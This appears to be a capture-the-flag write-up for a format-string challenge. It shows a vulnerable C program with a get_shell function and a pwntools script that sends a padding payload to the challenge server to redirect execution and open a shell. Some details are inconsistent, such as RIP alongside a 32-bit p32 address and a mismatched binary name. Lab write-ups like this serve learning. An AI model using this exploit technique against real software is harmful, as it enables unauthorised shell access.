# Write-up of the challenge "cmd center"

This challenge is part of the "Binary exploitation" category and is in **Level 1**.

# Goal of the challenge

The goal of the challenge is to use **Format string attack** and overwrite the **RIP** to make it point to the **get_shell** function.


## Program structure

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf);
    printf("ECHO : %s\n", stack_buf);
    return 0;
}

```

## Security breach

The vulnerability here is **sprintf(stack_buf, heap_buf);**, because it doesn't specify any options like **%s** so the goal of this challenge is to perform **Format string attack**. 


## Solution

So what I did first was to decompile the binary and check the offset needed to overwrite the **RIP**. So I found this while decompiling:

```c
char v0[144];  // [bp-0x9c] 0x9c = 156
```
The 144 resembles the stack size form the source code:

```c
char stack_buf[0x90] = {};
```

So now we know the offset to the **RIP** and I used **pwndbg** to check the address of the **get_shell function**, now we are all set for the exploit!

My idea is to use **format string attack** to send 156 of padding and overwrite the RIP with the **get_shell function**.

solve.py:

```python
from pwn import *

# p = process('./basic_exploitation_003')
p = remote('host3.dreamhack.games', 16081)

payload = b'%156c' + p32(0x08048669)

p.sendline(payload)

p.interactive()
```